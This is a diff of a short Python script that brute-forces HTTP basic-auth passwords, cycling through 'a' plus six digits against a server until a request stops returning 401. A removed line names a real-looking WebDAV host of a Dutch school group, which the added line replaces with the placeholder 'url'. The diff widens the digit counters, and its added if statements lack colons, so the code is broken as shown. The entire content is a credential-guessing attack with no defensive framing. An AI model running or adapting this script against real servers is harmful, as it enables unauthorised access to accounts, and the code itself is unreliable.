@@ -7,13 +7,13 @@ status = 401
 c1 = 0
 c2 = 0
 c3 = 0
-c4 = 6
-c5 = 9
-c6 = 8
+c4 = 0
+c5 = 0
+c6 = 0
 
 while status == 401:
     pwd = 'a' + str(c1) + str(c2) + str(c3) + str(c4) + str(c5) + str(c6)
-    r = requests.get('https://webdav.onderwijsgroepnoord.nl', auth=(str(user), pwd))
+    r = requests.get('url', auth=(str(user), pwd))
     status = r.status_code
 
     if status == 401:
@@ -36,5 +36,13 @@ while status == 401:
     if c3 == 10:
         c3 = 0
         c4 = c4 + 1
+        
+    if c4 == 10
+        c4 = 0
+        c5 = c5 + 1
+        
+    if c5 == 10
+        c5 = 0
+        c6 = c6 + 1
 
 yes = input('did it work? ')
